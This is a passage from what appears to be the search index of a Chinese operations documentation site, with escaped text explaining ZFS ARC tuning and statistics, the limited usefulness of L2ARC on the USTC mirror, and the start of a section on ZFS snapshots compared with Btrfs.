ARC \u200b\u4e2d\u200b\u88ab\u200b\u7f13\u5b58\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u8fd8\u662f\u200b\u9700\u8981\u200b\u4ece\u200b\u78c1\u76d8\u200b\u8bfb\u51fa\u6765\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u90fd\u200b\u4f1a\u200b\u7ecf\u7531\u200b ARC \u200b\u8fd4\u56de\u200b\u7ed9\u200b\u4e0a\u5c42\u200b\u5e94\u7528\u7a0b\u5e8f\u200b\u3002 \u200b\u7ed3\u5408\u200b ZFS \u200b\u7684\u200b\u591a\u7ea7\u200b metadata \u200b\u7b49\u200b\u590d\u6742\u200b\u7684\u200b\u8bbe\u8ba1\u200b\uff0cZFS \u200b\u9700\u8981\u200b\u4f7f\u7528\u200b\u4e00\u5b9a\u200b\u7684\u200b\u5185\u5b58\u200b\u4f5c\u4e3a\u200b ARC \u200b\u624d\u80fd\u200b\u4fdd\u8bc1\u200b\u78c1\u76d8\u200b\u7684\u200b\u6b63\u5e38\u200b\u8bfb\u5199\u64cd\u4f5c\u200b\uff0c\u200b\u800c\u200b\u4e0d\u200b\u50cf\u200b\u5176\u4ed6\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\uff08\u200b\u5982\u200b ext4\uff0cXFS \u200b\u7b49\u200b\uff09\u200b\u4ec5\u200b\u9700\u200b\u5728\u200b\u5185\u5b58\u200b\u4e2d\u200b\u7ef4\u62a4\u200b\u5c11\u91cf\u200b\u7684\u200b metadata \u200b\u5373\u53ef\u200b\u6b63\u5e38\u200b\u8fd0\u8f6c\u200b\u3002 ZFS ARC \u200b\u5141\u8bb8\u200b\u4f7f\u7528\u200b\u7684\u200b\u6700\u5927\u200b\u5185\u5b58\u200b\u91cf\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b <code>zfs_arc_max</code> \u200b\u53c2\u6570\u200b\u8c03\u8282\u200b\u3002\u200b\u9ed8\u8ba4\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0cZFS \u200b\u4f1a\u200b\u4f7f\u7528\u200b\u7cfb\u7edf\u200b\u5185\u5b58\u200b\u7684\u200b\u4e00\u534a\u200b\u4f5c\u4e3a\u200b ARC\uff0c\u200b\u4f46\u662f\u200b\u5982\u679c\u200b\u4f60\u200b\u7684\u200b\u670d\u52a1\u5668\u200b\u662f\u200b\u4e13\u7528\u200b\u4e8e\u200b\u5b58\u50a8\u200b\u548c\u200b\u6587\u4ef6\u200b\u670d\u52a1\u200b\u7684\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u8003\u8651\u200b\u5c06\u200b\u8fd9\u4e2a\u200b\u503c\u8c03\u200b\u5927\u200b\u4e00\u4e9b\u200b\u3002\u200b\u4f8b\u5982\u200b\uff1a</p> <pre><code># Set ARC memory limit to 4 GiB\necho 4294967296 &gt; /sys/module/zfs/parameters/zfs_arc_max\n</code></pre> <p>\u200b\u6216\u8005\u200b\u4f7f\u7528\u200b <code>/etc/modprobe.d/zfs.conf</code>\uff08\u200b\u89c1\u200b\u4e0a\u200b\uff09\u3002</p> <p>\u200b\u5982\u679c\u200b\u4f60\u200b\u7684\u200b\u7cfb\u7edf\u200b\u4e2d\u6709\u200b\u5176\u4ed6\u200b\u5927\u91cf\u200b\u5360\u7528\u200b\u5185\u5b58\u200b\u7684\u200b\u7a0b\u5e8f\u200b\uff0c\u200b\u6211\u4eec\u200b\u63a8\u8350\u200b\u4f60\u200b\u540c\u65f6\u200b\u8bbe\u7f6e\u200b\u4e00\u4e2a\u200b\u5408\u9002\u200b\u7684\u200b <code>zfs_arc_min</code> \u200b\u53c2\u6570\u200b\uff08\u200b\u5176\u200b\u9ed8\u8ba4\u503c\u200b\u4e3a\u200b\u96f6\u200b\uff09\uff0c\u200b\u4ee5\u200b\u4fdd\u8bc1\u200b ZFS \u200b\u80fd\u591f\u200b\u7ef4\u6301\u200b\u4e00\u5b9a\u200b\u7684\u200b\u6027\u80fd\u200b\u3002</p> <p>\u200b\u5728\u200b Linux \u200b\u4e0b\u200b\uff0c\u200b\u53d7\u9650\u4e8e\u200b kernel \u200b\u7684\u200b\u8bbe\u8ba1\u200b<sup>5</sup>\uff0cARC \u200b\u5360\u7528\u200b\u7684\u200b\u5185\u5b58\u200b\u4f1a\u200b\u5728\u200b htop / free \u200b\u7b49\u200b\u7a0b\u5e8f\u200b\u4e2d\u200b\u663e\u793a\u200b\u4e3a\u200b used \u200b\u800c\u200b\u4e0d\u662f\u200b cached\uff0c\u200b\u4f46\u662f\u200b\u5176\u200b\u884c\u4e3a\u200b\u548c\u200b cached \u200b\u662f\u200b\u4e00\u81f4\u200b\u7684\u200b\uff0c\u200b\u5373\u200b\u5728\u200b\u7cfb\u7edf\u200b\u5185\u5b58\u200b\u538b\u529b\u200b\u5347\u9ad8\u200b\u65f6\u4f1a\u200b\u81ea\u52a8\u200b\u91ca\u653e\u200b\uff0c\u200b\u4ee5\u4f9b\u200b\u5176\u4ed6\u200b\u7a0b\u5e8f\u200b\u4f7f\u7528\u200b\u3002</p> <p>\u200b\u5f3a\u5236\u200b\u91ca\u653e\u200b ARC</p> <p>\u200b\u4e0e\u200b cached \u200b\u5185\u5b58\u200b\u4e00\u6837\u200b\uff0c\u200b\u5728\u200b <code>echo 3 &gt; /proc/sys/vm/drop_caches</code> \u200b\u65f6\u200b\uff0cZFS ARC \u200b\u4f1a\u200b\u4e00\u540c\u200b\u91ca\u653e\u200b\u3002\u200b\u6ce8\u610f\u200b\uff1a</p> <ul> <li>\u200b\u8f83\u200b\u65b0\u200b\u7684\u200b ZFS \u200b\u7248\u672c\u200b\u4f1a\u200b\u9650\u5236\u200b\u6bcf\u6b21\u200b reclaim \u200b\u64cd\u4f5c\u200b\u7684\u200b\u9875\u6570\u200b\uff0c\u200b\u8fd9\u9879\u200b\u9650\u5236\u200b\u7531\u200b <code>zfs_arc_shrinker_limit</code> \u200b\u53c2\u6570\u200b\u63a7\u5236\u200b\uff0c\u200b\u9ed8\u8ba4\u200b\u4e3a\u200b 10000\u3002\u200b\u5982\u679c\u200b\u9700\u8981\u200b\u5f3a\u5236\u200b\u91ca\u653e\u200b ARC\uff0c\u200b\u9700\u8981\u200b\u5c06\u200b\u8be5\u200b\u53c2\u6570\u8bbe\u7f6e\u200b\u4e3a\u200b 0\uff0c\u200b\u5426\u5219\u200b\u53ef\u80fd\u200b\u4e0d\u80fd\u200b\u8d77\u5230\u200b\u9884\u671f\u200b\u7684\u200b\u6548\u679c\u200b\u3002</li> <li>\u200b\u8fd9\u4f1a\u200b\u77ed\u6682\u200b\u5730\u200b\u589e\u52a0\u200b\u78c1\u76d8\u200b\u7684\u200b\u8bfb\u53d6\u200b\u538b\u529b\u200b\u3002</li> </ul> <p>ZFS \u200b\u7684\u200b\u7f13\u5b58\u200b\u7b97\u6cd5\u200b\u975e\u5e38\u200b\u667a\u80fd\u200b\uff0c\u200b\u4f1a\u200b\u5c06\u200b\u53ef\u7528\u200b\u7684\u200b\u7f13\u5b58\u200b\u5bb9\u91cf\u200b\u5206\u4e3a\u200b MFU\uff08Most Frequently Used\uff09\u200b\u548c\u200b MRU\uff08Most Recently Used\uff09\u200b\u4e24\u200b\u90e8\u5206\u200b\uff0c\u200b\u5e76\u200b\u6839\u636e\u200b\u8d1f\u8f7d\u200b\u60c5\u51b5\u200b\u81ea\u52a8\u200b\u8c03\u6574\u200b\u4e24\u200b\u90e8\u5206\u200b\u7684\u200b\u5927\u5c0f\u200b\u3002</p> <p>ARC \u200b\u7684\u200b\u7edf\u8ba1\u200b\u4fe1\u606f\u200b\uff08\u200b\u5982\u200b\u5185\u5b58\u200b\u4f7f\u7528\u91cf\u200b\u3001MRU / MFU \u200b\u914d\u6bd4\u200b\u3001\u200b\u547d\u4e2d\u7387\u200b\u7b49\u200b\uff09\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b <code>/proc/spl/kstat/zfs/arcstats</code> \u200b\u67e5\u770b\u200b\uff0c\u200b\u5e76\u4e14\u200b ZFS \u200b\u4e5f\u200b\u63d0\u4f9b\u200b\u4e86\u200b <code>arc_summary</code> \u200b\u547d\u4ee4\u200b\u5c06\u200b\u8be5\u200b\u63a5\u53e3\u200b\u7684\u200b\u6570\u636e\u200b\u4ee5\u200b\u66f4\u200b\u6613\u8bfb\u200b\u7684\u200b\u65b9\u5f0f\u200b\u8f93\u51fa\u200b\u3002\u200b\u7531\u4e8e\u200b <code>arc_summary</code> \u200b\u8f93\u51fa\u91cf\u200b\u8f83\u5927\u200b\uff0c\u200b\u5efa\u8bae\u200b\u4f7f\u7528\u200b less \u200b\u7b49\u200b\u5206\u9875\u200b\u5de5\u5177\u200b\u67e5\u770b\u200b\u3002\u200b\u4f8b\u5982\u200b\uff1a</p> <pre><code>arc_summary | less\n</code></pre> I/O hit \u200b\u662f\u200b\u4ec0\u4e48\u200b <p>OpenZFS 2.2 \u200b\u65b0\u589e\u200b\u4e86\u200b\u4e00\u7c7b\u200b\u66f4\u52a0\u200b\u5177\u4f53\u200b\u7684\u200b\u7edf\u8ba1\u6570\u636e\u200b\uff0c\u200b\u5373\u200b ARC I/O hit\u3002 \u200b\u8fd9\u200b\u8868\u793a\u200b\u5c3d\u7ba1\u200b\u6570\u636e\u200b\u5e76\u200b\u4e0d\u200b\u5728\u200b ARC \u200b\u4e2d\u200b\uff0c\u200b\u4f46\u200b\u5df2\u7ecf\u200b\u5b58\u5728\u200b\u5bf9\u5e94\u200b\u7684\u200b\u78c1\u76d8\u200b I/O \u200b\u8bf7\u6c42\u200b\uff08\u200b\u4f8b\u5982\u200b\u6570\u636e\u200b\u6b63\u5728\u200b\u88ab\u200b prefetch\uff09\uff0c\u200b\u56e0\u6b64\u200b\u4e0d\u200b\u9700\u8981\u200b\u518d\u6b21\u200b\u4ece\u200b\u78c1\u76d8\u200b\u8bfb\u53d6\u6570\u636e\u200b<sup>6</sup>\u3002</p> <p>\u200b\u4e00\u4e2a\u200b\u7c97\u7565\u200b\uff08\u200b\u4f46\u200b\u4e0d\u200b\u4e00\u5b9a\u200b\u51c6\u786e\u200b\uff09\u200b\u7684\u200b\u7406\u89e3\u200b\u662f\u200b\uff1a\u200b\u5982\u679c\u200b\u77ac\u95f4\u200b\u4ea7\u751f\u200b\u4e86\u200b\u591a\u4e2a\u200b\u8bf7\u6c42\u200b\u8981\u200b\u8bfb\u53d6\u200b\u540c\u4e00\u4e2a\u200b\u6570\u636e\u200b\u5757\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5176\u4e2d\u200b\u4e00\u4e2a\u200b\u8bf7\u6c42\u200b\u4f1a\u200b\u4ea7\u751f\u200b\u4e00\u6b21\u200b ARC miss\uff0c\u200b\u800c\u200b\u5176\u4ed6\u200b\u8bf7\u6c42\u200b\u90fd\u200b\u4f1a\u200b\u4ea7\u751f\u200b ARC I/O hit\u3002</p> <p>\u200b\u5982\u679c\u200b\u4f60\u200b\u9700\u8981\u200b\u4e00\u4e2a\u200b\u7c7b\u4f3c\u200b <code>iostat</code> \u200b\u8fd9\u6837\u200b\u80fd\u591f\u200b\u6301\u7eed\u200b\u8f93\u51fa\u200b ARC \u200b\u7edf\u8ba1\u200b\u4fe1\u606f\u200b\u7684\u200b\u5de5\u5177\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u8003\u5bdf\u200b\u4e00\u4e0b\u200b <code>arcstat</code>\uff08<code>zfsutils-linux</code>\uff09\u3002</p> <p>\u200b\u8ffd\u8e2a\u200b\u6bcf\u4e2a\u200b\u8fdb\u7a0b\u200b\u7684\u200b ARC \u200b\u547d\u4e2d\u7387\u200b</p> <p>\u200b\u9605\u8bfb\u200b\u95ee\u9898\u200b\u8c03\u8bd5\u200b\u7684\u200b eBPF \u200b\u90e8\u5206\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u6ce8\u610f\u200b\u5230\u200b\uff0c\u200b\u57fa\u4e8e\u200b eBPF \u200b\u7684\u200b <code>cachetop</code> \u200b\u5de5\u5177\u200b\u53ef\u4ee5\u200b\u663e\u793a\u200b\u6bcf\u4e2a\u200b\u8fdb\u7a0b\u200b\u5bf9\u200b Linux \u200b\u5185\u6838\u200b\u7684\u200b\u9875\u200b\u7f13\u5b58\u200b\uff08page cache\uff09\u200b\u7684\u200b\u547d\u4e2d\u7387\u200b\u60c5\u51b5\u200b\uff08\u200b\u5982\u679c\u200b\u8fd8\u200b\u6ca1\u6709\u200b\u8dd1\u200b\u8fc7\u200b\u7684\u8bdd\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u8bd5\u4e00\u8bd5\u200b\uff0c\u200b\u5e76\u200b\u9605\u8bfb\u200b\u5176\u200b\u6e90\u4ee3\u7801\u200b\uff09\u3002</p> <p>ZFS ARC \u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u7528\u200b\u76f8\u4f3c\u200b\u7684\u200b\u65b9\u5f0f\u200b\u8fdb\u884c\u200b\u8ffd\u8e2a\u200b\uff08\u200b\u53ef\u4ee5\u200b\u624b\u52a8\u200b\u4f7f\u7528\u200b <code>bpftrace</code>\uff0c\u200b\u6216\u8005\u200b\u4fee\u6539\u200b <code>cachetop</code> \u200b\u7684\u200b\u6e90\u7801\u200b\uff09\u3002\u200b\u5c1d\u8bd5\u200b\u7f16\u5199\u200b\u5de5\u5177\u200b\uff0c\u200b\u4ee5\u200b\u8fdb\u7a0b\u200b\u4e3a\u200b\u5355\u4f4d\u200b\u663e\u793a\u200b ZFS ARC \u200b\u7684\u200b\u547d\u4e2d\u7387\u200b\u60c5\u51b5\u200b\u3002</p> <p>\u200b\u63d0\u793a\u200b\uff1a\u200b\u4f60\u200b\u53ef\u80fd\u200b\u4f1a\u60f3\u200b\u5148\u200b <code>sudo bpftrace -l | grep zfs | grep arc</code> \u200b\u6765\u200b\u67e5\u770b\u200b ZFS ARC \u200b\u7684\u200b\u76f8\u5173\u200b\u5185\u6838\u200b\u51fd\u6570\u200b\u3002</p> <p>\u200b\u76ee\u524d\u200b\uff0cZFS \u200b\u7684\u200b\u6587\u4ef6\u200b\u8bfb\u5199\u200b\u4e0d\u4f1a\u200b\u7ecf\u8fc7\u200b Linux \u200b\u81ea\u5df1\u200b\u7684\u200b page cache\uff0c\u200b\u9664\u4e86\u200b <code>mmap</code> \u200b\u7684\u200b\u60c5\u51b5\u200b\u9700\u8981\u200b\u540c\u65f6\u200b\u5728\u200b ARC \u200b\u548c\u200b page cache \u200b\u4fdd\u5b58\u200b\u4e24\u4efd\u200b\u7f13\u5b58\u200b\u4ee5\u5916\u200b\u3002\u200b\u5c1d\u8bd5\u200b\u9a8c\u8bc1\u200b\u8fd9\u200b\u4e00\u70b9\u200b\u3002</p>"},{"location":"ops/storage/zfs/#l2arc","title":"L2ARC","text":"<p>L2ARC \u200b\u662f\u200b ZFS \u200b\u7684\u200b\u4e8c\u7ea7\u7f13\u5b58\u200b\uff0c\u200b\u7528\u4e8e\u200b\u7f13\u5b58\u200b\u78c1\u76d8\u200b\u4e0a\u200b\u7684\u200b\u6570\u636e\u200b\u5757\u200b\uff0c\u200b\u901a\u5e38\u200b\u7531\u200b\u4e00\u4e2a\u200b\u6216\u200b\u591a\u4e2a\u200b SSD \u200b\u7ec4\u6210\u200b\uff0c\u200b\u4f5c\u4e3a\u200b ZFS \u200b\u7f13\u5b58\u200b\u7cfb\u7edf\u200b\u4e2d\u200b\u7684\u200b\u6b21\u7ea7\u200b\u3001\u200b\u975e\u6613\u5931\u200b\uff08non-volatile\uff09\u200b\u7684\u200b\u8bfb\u200b\u7f13\u5b58\u200b\u3002 L2ARC \u200b\u901a\u8fc7\u200b\u63a5\u7eb3\u200b\u4ece\u200b ARC \u200b\u4e2d\u200b\u88ab\u200b\u8e22\u200b\u51fa\u200b\uff08evicted\uff09\u200b\u7684\u200b\u6570\u636e\u200b\u5757\u200b\uff0c\u200b\u7ed3\u5408\u200b\u9884\u53d6\u200b\uff08prefetch\uff09\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u6765\u200b\u4ece\u200b\u673a\u68b0\u200b\u786c\u76d8\u200b\u9635\u5217\u200b\u4e2d\u200b\u5206\u62c5\u200b\u8bfb\u53d6\u200b\u538b\u529b\u200b\u3002 \u200b\u4e0e\u200b ARC \u200b\u7c7b\u4f3c\u200b\uff0cL2ARC \u200b\u4e0d\u200b\u5177\u5907\u200b\u5199\u200b\u7f13\u5b58\u200b\u7684\u200b\u529f\u80fd\u200b\uff0c\u200b\u4e0d\u4f1a\u200b\u7f13\u5b58\u200b\u6216\u200b\u7f13\u51b2\u200b\u5199\u5165\u200b\u7684\u200b\u6570\u636e\u200b\u3002</p> <p>\u200b\u4e00\u822c\u6765\u8bf4\u200b\uff0c\u200b\u5728\u200b\u642d\u5efa\u200b\u5b58\u50a8\u7cfb\u7edf\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5982\u679c\u200b\u9884\u671f\u200b\u7684\u200b\u70ed\u200b\u6570\u636e\u91cf\u200b\u8d85\u51fa\u200b\u4e86\u200b\u5185\u5b58\u5bb9\u91cf\u200b\uff08\u200b\u6216\u200b\u8ba1\u5212\u5206\u914d\u200b\u7ed9\u200b ARC \u200b\u7684\u200b\u5185\u5b58\u5bb9\u91cf\u200b\uff09\uff0c\u200b\u53ef\u4ee5\u200b\u8003\u8651\u200b\u4f7f\u7528\u200b SSD \u200b\u4f5c\u4e3a\u200b L2ARC \u200b\u7f13\u5b58\u200b\uff0c\u200b\u4f46\u200b\u7528\u4e8e\u200b\u7f13\u5b58\u200b\u7684\u200b SSD \u200b\u5bb9\u91cf\u200b\u4e0d\u5b9c\u200b\u8d85\u8fc7\u200b\u5185\u5b58\u200b\u7684\u200b 10 \u200b\u500d\u200b\u3002</p> <p>\u200b\u4f46\u200b\u6839\u636e\u200b\u6211\u4eec\u200b\u7684\u200b\u7ecf\u9a8c\u200b\uff0cL2ARC \u200b\u7684\u200b\u5b9e\u7528\u6027\u200b\u8f83\u200b\u5c0f\u200b\uff0c\u200b\u8fd9\u200b\u662f\u56e0\u4e3a\u200b\u901a\u5e38\u200b\u60c5\u51b5\u200b\u4e0b\u200b ZFS \u200b\u5b58\u50a8\u7cfb\u7edf\u200b\u4f1a\u200b\u5206\u914d\u200b\u8db3\u591f\u200b\u7684\u200b\u5185\u5b58\u200b\u4f5c\u4e3a\u200b ARC\uff0c\u200b\u4e14\u200b ARC \u200b\u672c\u8eab\u200b\u5df2\u7ecf\u200b\u6709\u200b\u6781\u200b\u9ad8\u200b\u7684\u200b\u547d\u4e2d\u7387\u200b\uff0c\u200b\u6b64\u65f6\u200b L2ARC \u200b\u80fd\u591f\u200b\u5e26\u6765\u200b\u7684\u200b\u8fb9\u9645\u200b\u6536\u76ca\u200b\u975e\u5e38\u200b\u5c0f\u200b\u3002 \u200b\u5bf9\u4e8e\u200b\u5927\u90e8\u5206\u200b\u7528\u6237\u200b\u6765\u8bf4\u200b\uff0c\u200b\u8282\u7ea6\u200b SSD \u200b\u7684\u200b\u5bff\u547d\u200b\u53ef\u80fd\u200b\u662f\u200b\u4e00\u4e2a\u200b\u66f4\u597d\u200b\u7684\u200b\u9009\u62e9\u200b\u3002</p> <p>USTC \u200b\u955c\u50cf\u200b\u7ad9\u4e0a\u200b\u7684\u200b ARC \u200b\u914d\u7f6e\u200b</p> <p>USTC \u200b\u955c\u50cf\u200b\u7ad9\u200b\u670d\u52a1\u5668\u200b\u914d\u5907\u200b\u4e86\u200b 256 GB \u200b\u5185\u5b58\u200b\uff0c\u200b\u5176\u4e2d\u200b\u5206\u914d\u200b\u4e86\u200b 200 GB \u200b\u7528\u4e8e\u200b ARC\uff0c\u200b\u6b64\u65f6\u200b\u957f\u671f\u200b\u7684\u200b ARC \u200b\u547d\u4e2d\u7387\u200b\u8d85\u8fc7\u200b 99%\uff0c\u200b\u800c\u200b L2ARC \u200b\u7684\u200b\u547d\u4e2d\u7387\u200b\u4ec5\u200b\u6709\u200b\u7ea6\u200b 35%\u3002 \u200b\u8fd9\u200b\u610f\u5473\u7740\u200b L2ARC \u200b\u4ec5\u4ec5\u200b\u5c06\u200b\u7efc\u5408\u200b\u547d\u4e2d\u7387\u200b\u4ece\u200b 99.2% \u200b\u63d0\u5347\u200b\u5230\u200b 99.5%\uff0c\u200b\u5bf9\u4e8e\u200b\u964d\u4f4e\u200b\u673a\u68b0\u200b\u786c\u76d8\u200b\u7684\u200b\u8d1f\u8f7d\u200b\u6548\u679c\u200b\u5e76\u200b\u4e0d\u200b\u660e\u663e\u200b\u3002</p> <p>\u200b\u56e0\u6b64\u200b\uff0c\u200b\u6211\u4eec\u200b\u63a8\u8350\u200b\u4f18\u5148\u200b\u6dfb\u52a0\u200b\u66f4\u200b\u591a\u200b\u7684\u200b\u5185\u5b58\u200b\u7528\u4e8e\u200b ARC\uff0c\u200b\u800c\u200b\u4e0d\u662f\u200b\u6dfb\u52a0\u200b L2ARC \u200b\u8bbe\u5907\u200b\u3002 \u200b\u5982\u679c\u200b\u4f60\u200b\u4ecd\u7136\u200b\u8ba4\u4e3a\u200b L2ARC \u200b\u6709\u7528\u200b\uff0c\u200b\u6211\u4eec\u200b\u5219\u200b\u5efa\u8bae\u200b\u4f60\u200b\u5728\u200b\u4f7f\u7528\u200b ZFS \u200b\u4e00\u6bb5\u65f6\u95f4\u200b\u540e\u200b\uff0c\u200b\u6839\u636e\u200b <code>arc_summary</code> \u200b\u7684\u200b\u8f93\u51fa\u200b\u6765\u200b\u51b3\u5b9a\u200b\u662f\u5426\u200b\u771f\u7684\u200b\u9700\u8981\u200b L2ARC\u3002</p> <p>\u200b\u4f5c\u4e3a\u200b\u603b\u7ed3\u200b\uff0c\u200b\u4ee5\u4e0b\u200b\u662f\u200b\u4e00\u4e2a\u200b\u7b80\u5355\u200b\u7684\u200b ZFS \u200b\u8bfb\u53d6\u200b\u6d41\u7a0b\u200b\uff1a</p> <ol> <li>\uff08\u200b\u6536\u5230\u200b\u5e94\u7528\u7a0b\u5e8f\u200b\u7684\u200b\u8bfb\u53d6\u200b\u8bf7\u6c42\u200b\uff09</li> <li>\u200b\u68c0\u67e5\u6570\u636e\u200b\u662f\u5426\u200b\u5df2\u200b\u5728\u200b ARC \u200b\u4e2d\u200b\uff0c\u200b\u5982\u679c\u200b\u662f\u200b\uff0c\u200b\u5219\u200b\u8fd4\u56de\u200b\u6570\u636e\u200b\uff0c\u200b\u8bb0\u5f55\u200b\u4e3a\u200b\u4e00\u6b21\u200b ARC \u200b\u547d\u4e2d\u200b\uff1b\u200b\u5426\u5219\u200b\u8bb0\u5f55\u200b\u4e3a\u200b\u4e00\u6b21\u200b ARC miss\u3002</li> <li>\u200b\u68c0\u67e5\u6570\u636e\u200b\u662f\u5426\u200b\u5728\u200b L2ARC \u200b\u4e2d\u200b\uff0c\u200b\u5982\u679c\u200b\u662f\u200b\uff0c\u200b\u5219\u200b\u8f7d\u5165\u200b ARC\uff0c\u200b\u5e76\u200b\u8fd4\u56de\u200b\u7ed9\u200b\u5e94\u7528\u7a0b\u5e8f\u200b\uff0c\u200b\u8bb0\u5f55\u200b\u4e3a\u200b\u4e00\u6b21\u200b L2ARC \u200b\u547d\u4e2d\u200b\uff1b\u200b\u5426\u5219\u200b\u8bb0\u5f55\u200b\u4e3a\u200b\u4e00\u6b21\u200b L2ARC miss\u3002</li> <li>\u200b\u4ece\u200b\u78c1\u76d8\u200b\u8bfb\u53d6\u6570\u636e\u200b\uff0c\u200b\u8f7d\u5165\u200b ARC\uff0c\u200b\u540c\u65f6\u200b\u8fd4\u56de\u200b\u7ed9\u200b\u5e94\u7528\u7a0b\u5e8f\u200b\u3002</li> </ol> <p>\u200b\u5728\u200b\u7b2c\u200b 3 \u200b\u6b65\u200b\u6216\u200b\u7b2c\u200b 4 \u200b\u6b65\u4e2d\u200b\uff0c\u200b\u5982\u679c\u200b ARC \u200b\u5df2\u6ee1\u200b\uff0cZFS \u200b\u4f1a\u200b\u6839\u636e\u200b\u4e00\u7cfb\u5217\u200b\u7b97\u6cd5\u200b\u5c06\u200b\u9002\u91cf\u200b\u7684\u200b\u6570\u636e\u200b\u5757\u200b\u4ece\u200b ARC \u200b\u4e2d\u200b\u8e22\u200b\u51fa\u200b\u5e76\u200b\u653e\u5165\u200b L2ARC \u200b\u4e2d\u200b\uff0c\u200b\u8fd9\u662f\u200b L2ARC \u200b\u4e2d\u200b\u6570\u636e\u200b\u7684\u200b\u552f\u4e00\u200b\u6765\u6e90\u200b\u3002 \u200b\u6ce8\u610f\u200b\u5230\u200b\u5f53\u200b\u8bfb\u53d6\u200b\u8bf7\u6c42\u200b\u53d1\u751f\u200b L2ARC hit \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5b83\u200b\u4e5f\u200b\u4f1a\u200b\u88ab\u200b\u8f7d\u5165\u200b ARC\uff0c\u200b\u56e0\u6b64\u200b\u53cd\u590d\u200b\u8bfb\u53d6\u200b\u7684\u200b\u6570\u636e\u200b\uff08\u200b\u5f88\u200b\u53ef\u80fd\u200b\uff09\u200b\u53ea\u4f1a\u200b\u4ea7\u751f\u200b\u4e00\u6b21\u200b L2ARC hit\uff0c\u200b\u8fd9\u200b\u4e5f\u200b\u662f\u200b L2ARC \u200b\u547d\u4e2d\u7387\u200b\u901a\u5e38\u200b\u8f83\u200b\u4f4e\u200b\u7684\u200b\u539f\u56e0\u200b\u4e4b\u4e00\u200b\u3002</p>"},{"location":"ops/storage/zfs/#snapshot","title":"\u5feb\u7167","text":"<p>ZFS \u200b\u7684\u200b\u5feb\u7167\u200b\u662f\u200b\u4e00\u79cd\u200b\u975e\u5e38\u200b\u5f3a\u5927\u200b\u7684\u200b\u529f\u80fd\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5728\u200b\u4e0d\u200b\u5360\u7528\u200b\u989d\u5916\u200b\u7a7a\u95f4\u200b\u7684\u200b\u60c5\u51b5\u200b\u4e0b\u200b\u8bb0\u5f55\u200b\u6570\u636e\u200b\u96c6\u200b\uff08\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u6216\u200b zvol\uff09\u200b\u7684\u200b\u72b6\u6001\u200b\uff0c\u200b\u5e76\u4e14\u200b\u53ef\u4ee5\u200b\u968f\u65f6\u200b\u56de\u6eda\u200b\u5230\u200b\u5feb\u7167\u200b\u7684\u200b\u72b6\u6001\u200b\uff08\u200b\u4e22\u5f03\u200b\u8be5\u200b\u5feb\u7167\u200b\u4ee5\u540e\u200b\u7684\u200b\u6240\u6709\u200b\u53d8\u5316\u200b\uff09\u3002</p> <p>ZFS \u200b\u5feb\u7167\u200b\u7ecf\u5e38\u200b\u88ab\u200b\u4e0e\u200b Btrfs \u200b\u7684\u200b\u5feb\u7167\u200b\u8fdb\u884c\u200b\u6bd4\u8f83\u200b\uff0c\u200b\u4e00\u4e9b\u200b\u5e38\u89c1\u200b\u7684\u200b\u76f8\u540c\u70b9\u200b\u548c\u200b\u76f8\u4f3c\u4e4b\u5904\u200b\u5982\u200b\uff1a</p> <ul> <li>ZFS \u200b\u548c\u200b Btrfs \u200b\u7684\u200b\u5feb\u7167\u200b\u90fd\u200b\u662f\u200b\u5229\u7528\u200b CoW\uff08Copy-on-Write\uff09\u200b\u6280\u672f\u200b\u5b9e\u73b0\u200b\u7684\u200b\uff0c\u200b\u5373\u200b\u5728\u200b\u4e00\u200b\u5f00\u59cb\u200b\uff0c\u200b\u5feb\u7167\u200b\u548c\u200b\u6570\u636e\u200b\u96c6\u200b\uff08\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\uff09\u200b\u7684\u200b\u5f53\u524d\u200b\u72b6\u6001\u200b\u5171\u4eab\u200b\u6240\u6709\u200b\u7684\u200b\u6570\u636e\u200b\u5757\u200b\u548c\u200b\u5143\u200b\u6570\u636e\u200b\uff08\u200b\u5982\u200b\u6307\u9488\u200b\u7b49\u200b\uff09\u3002   \u200b\u4ec5\u200b\u5f53\u200b\u6709\u200b\u65b0\u200b\u6570\u636e\u200b\u4ea7\u751f\u200b\u65f6\u200b\uff0c\u200b\u624d\u200b\u4f1a\u200b\u5199\u5165\u200b\u65b0\u200b\u7684\u200b\u6570\u636e\u200b\u5757\u200b\u548c\u200b\u65b0\u200b\u7684\u200b\u6307\u9488\u200b\uff0c\u200b\u800c\u200b\u672a\u200b\u53d1\u751f\u53d8\u5316\u200b\u7684\u200b\u6570\u636e\u200b\u4ecd\u7136\u200b\u5171\u4eab\u200b\u3002</li> <li>ZFS \u200b\u548c\u200b Btrfs \u200b\u7684\u200b\u5feb\u7167\u200b\u90fd\u200b\u53ef\u4ee5\u200b\u7528\u4e8e\u200b\u514b\u9686\u200b\uff08clone\uff09\u200b\u51fa\u65b0\u200b\u7684\u200b\u6570\u636e\u200b\u96c6\u200b\uff08\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\uff09\uff0c\u200b\u5373\u200b\u5728\u200b\u5feb\u7167\u200b\u7684\u200b\u57fa\u7840\u200b\u4e0a\u200b\u521b\u5efa\u200b\u4e00\u4e2a\u200b\u65b0\u200b\u7684\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\uff0c\u200b\u800c\u200b\u4e0d\u200b\u9700\u8981\u200b\u590d\u5236\u200b\u6240\u6709\u200b\u7684\u200b\u6570\u636e\u200b\u3002</li> <li>ZFS \u200b\u548c\u200b Btrfs 